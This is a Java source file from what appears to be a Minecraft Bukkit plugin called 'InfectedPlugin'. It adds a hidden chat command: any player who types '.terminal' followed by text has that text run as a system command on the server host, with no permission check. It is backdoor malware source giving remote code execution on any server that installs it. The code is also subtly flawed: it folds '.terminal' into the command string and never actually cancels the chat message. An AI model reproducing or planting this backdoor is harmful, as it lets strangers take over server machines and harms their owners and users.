package org.CreeperCoders.InfectedPlugin.Commands;

import org.CreeperCoders.InfectedPlugin.IP_RunSystemCommand;
import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_terminal implements Listener
{
    private InfectedPlugin plugin;

    public Command_terminal(InfectedPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = false;
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
    
            if (args[0].equalsIgnoreCase(".terminal"))
            {
                String command;
                try
                {
                    StringBuilder command_bldr = new StringBuilder();
                    for (int i = 0; i < args.length; i++)
                    {
                        command_bldr.append(args[i]).append(" ");
                    }
                    command = command_bldr.toString().trim();
                }
                catch (Throwable ex)
                {
                    p.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
                    return;
                }
            
                p.sendMessage("Running system command: " + command);
                server.getScheduler().runTaskAsynchronously(plugin, new IP_RunSystemCommand(command, plugin));
                cancel = true;
                return;
            }
            if (cancel)
            {
               event.setCancelled(true);
               return;
            }
        }
    }
}
